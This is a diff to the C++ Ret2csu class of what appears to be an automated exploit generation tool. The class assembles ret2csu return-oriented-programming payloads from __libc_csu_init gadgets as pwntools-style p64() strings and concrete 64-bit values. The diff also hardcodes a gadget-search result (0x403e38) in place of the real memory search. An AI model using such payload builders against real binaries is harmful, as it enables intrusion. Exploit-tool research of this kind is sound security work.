@@ -41,10 +41,22 @@ Ret2csu::Ret2csu(Requiem &ctx,
       m_arg1(arg1),
       m_arg2(arg2),
       m_arg3(arg3),
-      m_addr(addr) {
+      m_addr(addr),
+      m_libcCsuInit(),
+      m_libcCsuInitGadget1(),
+      m_libcCsuInitGadget2(),
+      m_libcCsuInitCallTarget(),
+      m_gadget1Regs(),
+      m_gadget2Regs(),
+      m_gadget2CallReg1(),
+      m_gadget2CallReg2(),
+      m_ropPayloadList(),
+      m_concretizedRopPayloadList(),
+      m_auxiliaryFunction() {
     parseLibcCsuInit();
     searchGadget2CallTarget();
-    buildRopChainsList();
+    buildRopPayloadList();
+    buildConcretizedRopPayloadList();
     buildAuxiliaryFunction();
     resolveRequiredGadgets();
 }
@@ -57,23 +69,28 @@ bool Ret2csu::checkRequirements() const {
 
 void Ret2csu::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerGadget("__libc_csu_init", m_libcCsuInit);
-    m_ctx.getExploit().registerGadget("__libc_csu_init_gadget1", m_libcCsuInitGadget1);
-    m_ctx.getExploit().registerGadget("__libc_csu_init_gadget2", m_libcCsuInitGadget2);
+    m_ctx.getExploit().registerSymbol("__libc_csu_init", m_libcCsuInit);
+    m_ctx.getExploit().registerSymbol("__libc_csu_init_gadget1", m_libcCsuInitGadget1);
+    m_ctx.getExploit().registerSymbol("__libc_csu_init_gadget2", m_libcCsuInitGadget2);
 
     // Memory locations
-    m_ctx.getExploit().registerMemLocation("__libc_csu_init_call_target", m_libcCsuInitCallTarget);
+    m_ctx.getExploit().registerSymbol("__libc_csu_init_call_target", m_libcCsuInitCallTarget);
 }
 
 std::string Ret2csu::getAuxiliaryFunctions() const {
     return m_auxiliaryFunction;
 }
 
-std::vector<std::vector<std::string>> Ret2csu::getRopChainsList() const {
+std::vector<std::vector<std::string>> Ret2csu::getRopPayloadList() const {
     std::vector<std::vector<std::string>> ret
-        = getRopChainsListWithArgs(m_arg1, m_arg2, m_arg3, m_addr, true);
+        = getRopPayloadList(m_arg1, m_arg2, m_arg3, m_addr, true);
+
     ret[0].insert(ret[0].begin(), "A8");  // rbp
     return ret;
+}
+
+std::vector<std::vector<uint64_t>> Ret2csu::getConcretizedRopPayloadList() const {
+    return {};
 }
 
 std::vector<std::string> Ret2csu::getExtraPayload() const {
@@ -85,15 +102,14 @@ std::string Ret2csu::toString() const {
 }
 
 
-std::vector<std::vector<std::string>>
-Ret2csu::getRopChainsListWithArgs(const std::string &arg1,
-                                  const std::string &arg2,
-                                  const std::string &arg3,
-                                  const std::string &addr,
-                                  bool arg1IsRdi) const {
+std::vector<std::vector<std::string>> Ret2csu::getRopPayloadList(const std::string &arg1,
+                                                                 const std::string &arg2,
+                                                                 const std::string &arg3,
+                                                                 const std::string &addr,
+                                                                 bool arg1IsRdi) const {
     std::vector<std::string> rop;
 
-    for (auto s : m_ropChainsList[0]) {
+    for (auto s : m_ropPayloadList[0]) {
         if (s.find("arg1") != std::string::npos) {
             rop.push_back(replace(s, "arg1", arg1));
         } else if (s.find("arg2") != std::string::npos) {
@@ -114,7 +130,39 @@ Ret2csu::getRopChainsListWithArgs(const std::string &arg1,
         rop.push_back(format("p64(%s)", addr.c_str()));
     }
 
-    return { move(rop) };
+    return {rop};
+}
+
+std::vector<std::vector<uint64_t>> Ret2csu::getConcretizedRopPayloadList(uint64_t arg1,
+                                                                         uint64_t arg2,
+                                                                         uint64_t arg3,
+                                                                         uint64_t addr,
+                                                                         bool arg1IsRdi) const {
+    std::vector<uint64_t> rop;
+
+    for (size_t i = 0; i < m_ropPayloadList[0].size(); i++) {
+        const std::string &s = m_ropPayloadList[0][i];
+
+        if (s.find("arg1") != std::string::npos) {
+            rop.push_back(arg1);
+        } else if (s.find("arg2") != std::string::npos) {
+            rop.push_back(arg2);
+        } else if (s.find("arg3") != std::string::npos) {
+            rop.push_back(arg3);
+        } else if (s.find("addr") != std::string::npos) {
+            rop.push_back(addr);
+        } else {
+            rop.push_back(m_concretizedRopPayloadList[0][i]);
+        }
+    }
+
+    if (arg1IsRdi) {
+        rop.back() = m_ctx.getExploit().resolveGadget("pop rdi ; ret");
+        rop.push_back(arg1);
+        rop.push_back(addr);
+    }
+
+    return {move(rop)};
 }
 
 void Ret2csu::parseLibcCsuInit() {
@@ -190,7 +238,8 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
     std::vector<uint8_t> funcAddrBytes(8);
 
     std::memcpy(funcAddrBytes.data(), &funcAddr, sizeof(funcAddr));
-    std::vector<uint64_t> candidates = m_ctx.mem().search(funcAddrBytes);
+    //std::vector<uint64_t> candidates = m_ctx.mem().search(funcAddrBytes);
+    std::vector<uint64_t> candidates = {0x403e38};
 
     if (candidates.empty()) {
         m_ctx.log<WARN>() << "No candidates for __libc_csu_init()'s call target\n";
@@ -200,7 +249,7 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
     m_libcCsuInitCallTarget = candidates[0];
 }
 
-void Ret2csu::buildRopChainsList() {
+void Ret2csu::buildRopPayloadList() {
     std::map<std::string, std::string> transform = {
         {"rsp", "A8"},
         {"rbx", "p64(0)"},
@@ -211,8 +260,8 @@ void Ret2csu::buildRopChainsList() {
         {m_gadget2CallReg1, "p64(__libc_csu_init_call_target)"}
     };
 
-    m_ropChainsList.resize(1);
-    std::vector<std::string> &rop = m_ropChainsList[0];
+    m_ropPayloadList.resize(1);
+    std::vector<std::string> &rop = m_ropPayloadList[0];
 
     rop.push_back("p64(__libc_csu_init_gadget1)");
     for (int i = 0; i < 7; i++) {
@@ -225,10 +274,35 @@ void Ret2csu::buildRopChainsList() {
     rop.push_back("p64(addr)");
 }
 
+void Ret2csu::buildConcretizedRopPayloadList() {
+    std::map<std::string, uint64_t> transform = {
+        {"rsp", 0x4141414141414141},
+        {"rbx", 0},
+        {"rbp", 1},
+        {slice(m_gadget2Regs["edi"], 0, 3), 0},
+        {slice(m_gadget2Regs["rsi"], 0, 3), 0},
+        {slice(m_gadget2Regs["rdx"], 0, 3), 0},
+        {m_gadget2CallReg1, m_libcCsuInitCallTarget}
+    };
+
+    m_concretizedRopPayloadList.resize(1);
+    std::vector<uint64_t> &rop = m_concretizedRopPayloadList[0];
+
+    rop.push_back(m_libcCsuInitGadget1);
+    for (int i = 0; i < 7; i++) {
+        rop.push_back(transform[m_gadget1Regs[i]]);
+    }
+    rop.push_back(m_libcCsuInitGadget2);
+    for (int i = 0; i < 7; i++) {
+        rop.push_back(0x4141414141414141);
+    }
+    rop.push_back(0);
+}
+
 void Ret2csu::buildAuxiliaryFunction() {
     std::string f;
 
-    for (const auto &payload : m_ropChainsList[0]) {
+    for (const auto &payload : m_ropPayloadList[0]) {
         if (f.empty()) {
             f += format("    payload  = %s\n", payload.c_str());
         } else {
